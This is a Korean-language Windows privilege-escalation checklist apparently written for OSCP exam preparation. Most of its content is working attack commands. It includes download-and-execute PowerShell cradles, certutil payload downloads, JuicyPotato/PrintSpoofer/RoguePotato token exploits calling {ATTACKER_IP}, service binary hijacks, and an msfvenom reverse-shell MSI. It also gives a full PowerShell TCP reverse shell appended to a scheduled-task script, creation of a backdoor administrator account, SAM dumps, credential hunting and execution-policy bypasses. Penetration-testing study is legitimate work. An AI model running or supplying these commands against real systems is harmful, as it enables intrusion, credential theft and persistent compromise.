# 🪟 Windows Privilege Escalation Checklist

> **OSCP 필수**: Windows 쉘 획득 후 SYSTEM/Administrator 권한 얻기까지 체계적 가이드

## ⚡ 즉시 실행할 명령어들

### 🚀 첫 30초에 할 것들 (백그라운드로 실행)

```powershell
# PowerShell에서 실행 (WinPEAS 다운로드 및 실행)
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')

# 또는 CMD에서
powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"

# winPEAS.exe 다운로드 (방화벽 우회시)
certutil -urlcache -split -f "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.exe" winpeas.exe
.\winpeas.exe
```

### 🔍 즉시 확인할 핵심 항목들

```cmd
# 기본 시스템 정보
whoami
whoami /priv
whoami /groups
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# 네트워크 정보
ipconfig /all
netstat -ano | findstr LISTENING

# 사용자 및 그룹 정보
net user
net localgroup administrators
```

## 📋 단계별 체크리스트 (시간순)

### 🕐 0-5분: 기본 정보 수집

- [ ] **시스템 정보 확인**

  ```cmd
  whoami
  whoami /priv
  whoami /groups
  systeminfo
  hostname
  echo %USERNAME%
  echo %COMPUTERNAME%
  ```

- [ ] **OS 버전 및 패치 레벨**

  ```cmd
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
  wmic qfe list
  driverquery
  ```

- [ ] **네트워크 정보**
  ```cmd
  ipconfig /all
  route print
  arp -a
  netstat -ano
  netsh firewall show state
  netsh firewall show config
  ```

### 🕐 5-10분: 사용자 및 권한 확인

- [ ] **사용자 정보 확인**

  ```cmd
  net user
  net user %USERNAME%
  net localgroup
  net localgroup administrators
  net localgroup "Remote Desktop Users"
  ```

- [ ] **현재 권한 확인 (최우선!)**

  ```cmd
  whoami /priv
  whoami /groups
  whoami /all
  ```

- [ ] **로그인 세션 정보**
  ```cmd
  qwinsta
  quser
  query session
  ```

### 🕐 10-15분: 서비스 및 프로세스 확인

- [ ] **실행 중인 프로세스**

  ```cmd
  tasklist /svc
  wmic process list full
  ps (PowerShell)
  Get-Process (PowerShell)
  ```

- [ ] **서비스 확인**

  ```cmd
  net start
  wmic service list brief
  sc query
  Get-Service (PowerShell)
  ```

- [ ] **스케줄된 태스크**
  ```cmd
  schtasks /query /fo LIST /v
  schtasks /query /fo TABLE
  Get-ScheduledTask (PowerShell)
  ```

### 🕐 15-20분: 파일 시스템 및 레지스트리

- [ ] **중요 디렉토리 권한**

  ```cmd
  icacls "C:\Program Files"
  icacls "C:\Program Files (x86)"
  icacls "C:\Windows\System32"
  dir /a "C:\"
  dir /a "C:\Users"
  ```

- [ ] **설치된 소프트웨어**

  ```cmd
  wmic product get name,version
  dir "C:\Program Files"
  dir "C:\Program Files (x86)"
  reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
  ```

- [ ] **레지스트리 중요 키들**
  ```cmd
  reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
  reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  ```

### 🕐 20-25분: 네트워크 및 보안 설정

- [ ] **방화벽 설정**

  ```cmd
  netsh firewall show state
  netsh firewall show config
  netsh advfirewall firewall show rule name=all
  ```

- [ ] **공유 폴더 및 드라이브**

  ```cmd
  net share
  wmic share list
  wmic logicaldisk get size,freespace,caption
  ```

- [ ] **환경 변수**
  ```cmd
  set
  echo %PATH%
  echo %PATHEXT%
  ```

## 🎯 발견별 익스플로잇 방법

### 🔑 특권 토큰 발견시

#### SeImpersonatePrivilege 또는 SeAssignPrimaryTokenPrivilege

```cmd
# Juicy Potato (Windows Server 2016 이하)
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

# PrintSpoofer (Windows 10/Server 2019+)
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
PrintSpoofer64.exe -i -c cmd

# RoguePotato
wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.exe
RoguePotato.exe -r {ATTACKER_IP} -e "cmd.exe" -l 9999
```

#### SeDebugPrivilege

```powershell
# 프로세스 토큰 훔치기
psgetsid.exe -accepteula
# 또는
Get-Process winlogon | Select-Object Id
```

#### SeBackupPrivilege

```cmd
# SAM 및 SYSTEM 레지스트리 덤프
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
# 오프라인에서 해시 추출 후 Pass-the-Hash
```

### 🔧 서비스 취약점 발견시

#### Unquoted Service Path

```cmd
# 취약한 서비스 찾기
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# 악용 - 실행 파일 교체
sc stop "Vulnerable Service"
copy evil.exe "C:\Program Files\Some Service\Service.exe"
sc start "Vulnerable Service"
```

#### Weak Service Permissions

```cmd
# 서비스 권한 확인
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv Everyone * /accepteula

# 서비스 바이너리 경로 변경
sc config "service_name" binpath= "C:\temp\evil.exe"
sc stop "service_name"
sc start "service_name"
```

#### Weak Service Binary Permissions

```cmd
# 바이너리 권한 확인
icacls "C:\Program Files\Service\service.exe"

# 바이너리 교체
takeown /f "C:\Program Files\Service\service.exe"
copy evil.exe "C:\Program Files\Service\service.exe"
sc stop service_name
sc start service_name
```

### 🗂️ 레지스트리 취약점

#### AlwaysInstallElevated

```cmd
# 확인
reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer

# 둘 다 AlwaysInstallElevated=1이면 악용 가능
msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

#### AutoLogon 크레덴셜

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon

# 발견된 크레덴셜로 로그인 시도
runas /user:administrator cmd
```

### 📅 스케줄된 태스크 취약점

```cmd
# 쓰기 가능한 태스크 스크립트 찾기
schtasks /query /fo LIST /v | findstr /i "task to run"
icacls "C:\path\to\scheduled\script.bat"

# 스크립트 수정
echo "net user hacker password123 /add" >> "C:\path\to\scheduled\script.bat"
echo "net localgroup administrators hacker /add" >> "C:\path\to\scheduled\script.bat"

# 또는 리버스쉘
echo "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" >> script.bat
```

### 💾 커널 익스플로잇

```cmd
# 시스템 정보로 익스플로잇 검색
systeminfo > systeminfo.txt
# Windows-Exploit-Suggester 사용 (Kali에서)
# python windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo systeminfo.txt

# 자주 나오는 커널 익스플로잇들
# MS16-032 (Windows 7-10/2008-2016)
powershell -ExecutionPolicy ByPass -command "& { . C:\temp\Invoke-MS16032.ps1; Invoke-MS16032 }"

# MS17-010 (EternalBlue)
# PrivExchange 등
```

## 🤖 자동화 도구 활용

### 🔍 WinPEAS (최고 우선순위)

```powershell
# PowerShell 버전
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')

# 실행 파일 버전
certutil -urlcache -split -f "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.exe" winpeas.exe
.\winpeas.exe

# 결과를 파일로 저장
.\winpeas.exe > winpeas_output.txt
```

### 🛡️ PowerUp (PowerSploit)

```powershell
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks

# 특정 검사들
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceUnquoted
```

### 🔧 Sherlock (PowerShell)

```powershell
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')
Find-AllVulns
```

### 📊 AccessChk (SysInternals)

```cmd
# 다운로드
certutil -urlcache -split -f "https://download.sysinternals.com/files/AccessChk.zip" accesschk.zip

# 사용법
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv Everyone * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
```

### 🔍 Watson (커널 익스플로잇 검색)

```cmd
certutil -urlcache -split -f "https://github.com/rasta-mouse/Watson/releases/download/v2.0/Watson.exe" watson.exe
.\watson.exe
```

## 👀 놓치기 쉬운 것들

### 🚨 Critical - 반드시 확인해야 할 것들

- [ ] **SeImpersonatePrivilege 확인**

  ```cmd
  whoami /priv | findstr SeImpersonatePrivilege
  # 있으면 99% 성공! Juicy Potato, PrintSpoofer 등 사용
  ```

- [ ] **IIS 관련 권한**

  ```cmd
  # IIS_IUSRS 그룹에 속하면 SeImpersonatePrivilege 있을 가능성 높음
  whoami /groups | findstr IIS_IUSRS
  ```

- [ ] **SQL Server 서비스 계정**

  ```cmd
  # SQL Server 서비스로 실행중이면 SeImpersonatePrivilege 있음
  whoami /groups | findstr "SERVICE SID"
  ```

- [ ] **AlwaysInstallElevated 레지스트리**
  ```cmd
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  # 둘 다 0x1이면 즉시 SYSTEM 가능!
  ```

### ⚠️ 자주 놓치는 것들

- [ ] **Credential Manager에서 저장된 크레덴셜**

  ```cmd
  cmdkey /list
  dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\
  dir /a %USERPROFILE%\AppData\Roaming\Microsoft\Credentials\
  ```

- [ ] **DPAPI 마스터키와 크레덴셜**

  ```cmd
  dir /a %USERPROFILE%\AppData\Roaming\Microsoft\Protect\
  # mimikatz로 DPAPI 크레덴셜 복호화 가능
  ```

- [ ] **PowerShell 히스토리**

  ```powershell
  Get-Content (Get-PSReadlineOption).HistorySavePath
  # 또는
  type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  ```

- [ ] **IIS 설정 파일들**

  ```cmd
  type C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config
  type C:\inetpub\wwwroot\web.config
  # connectionStrings에서 DB 크레덴셜 확인
  ```

- [ ] **Unattend 파일들에서 패스워드**
  ```cmd
  dir /s *unattend.xml
  dir /s *unattended.xml
  dir /s *autounattend.xml
  # 기본 관리자 패스워드가 있을 수 있음
  ```

### 🔍 세밀한 확인사항들

- [ ] **레지스트리에서 AutoLogon 정보**

  ```cmd
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
  ```

- [ ] **Group Policy Preferences (GPP) 패스워드**

  ```cmd
  # SYSVOL에서 Groups.xml, Services.xml 등 확인
  findstr /S /I cpassword \\%USERDOMAIN%\sysvol\%USERDOMAIN%\policies\*.xml
  ```

- [ ] **환경 변수에서 크레덴셜**

  ```cmd
  set | findstr /i password
  set | findstr /i pass
  ```

- [ ] **메모리 덤프 파일들**

  ```cmd
  dir /s /a hiberfil.sys
  dir /s /a pagefile.sys
  dir /s /a *.dmp
  # 메모리 덤프에서 크레덴셜 추출 가능
  ```

- [ ] **백업 파일들**
  ```cmd
  dir /s /a *.bak
  dir /s /a *backup*
  dir /s /a *.old
  ```

## ⏰ 시간 관리 팁

### 🕐 처음 10분 (High Priority)

1. **whoami /priv** - SeImpersonatePrivilege 확인
2. **WinPEAS 실행** (백그라운드)
3. **AlwaysInstallElevated** 레지스트리 확인
4. **서비스 권한** 빠른 체크

### 🕐 다음 15분 (Medium Priority)

1. **스케줄된 태스크** 확인
2. **Unquoted Service Path** 찾기
3. **AutoLogon 정보** 확인
4. **커널 익스플로잇** 확인

### 🕐 25분 이후 (Deep Dive)

1. **WinPEAS 결과 분석**
2. **크레덴셜 사냥** (레지스트리, 파일)
3. **고급 공격 기법**
4. **메모리/백업 파일 확인**

### 🚨 30분 경과시 체크포인트

- [ ] **SeImpersonatePrivilege** 다시 한번 확인
- [ ] **WinPEAS 결과**에서 RED 항목들 재검토
- [ ] **모든 서비스** GTFOBins에서 재검색
- [ ] **다른 사용자로 전환** 시도 (runas)

## 🎯 성공률 높은 순서

1. **SeImpersonatePrivilege** (성공률: 매우 높음)
2. **AlwaysInstallElevated** (성공률: 높음)
3. **Unquoted Service Path** (성공률: 높음)
4. **약한 서비스 권한** (성공률: 중간)
5. **AutoLogon 크레덴셜** (성공률: 중간)
6. **커널 익스플로잇** (성공률: 중간)

## 🔧 PowerShell 실행 정책 우회

```powershell
# 여러 우회 방법들
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ExecutionPolicy Unrestricted -File script.ps1
powershell -ExecutionPolicy RemoteSigned -File script.ps1
powershell -ep bypass -file script.ps1

# 다운로드 후 실행
powershell "IEX(New-Object Net.WebClient).downloadString('http://url/script.ps1')"

# Base64 인코딩
powershell -EncodedCommand <base64_encoded_command>
```

**기억하세요**: OSCP Windows 환경에서는 SeImpersonatePrivilege가 있는 계정이 매우 많습니다. 이를 최우선으로 확인하고, WinPEAS 결과를 꼼꼼히 분석하세요!
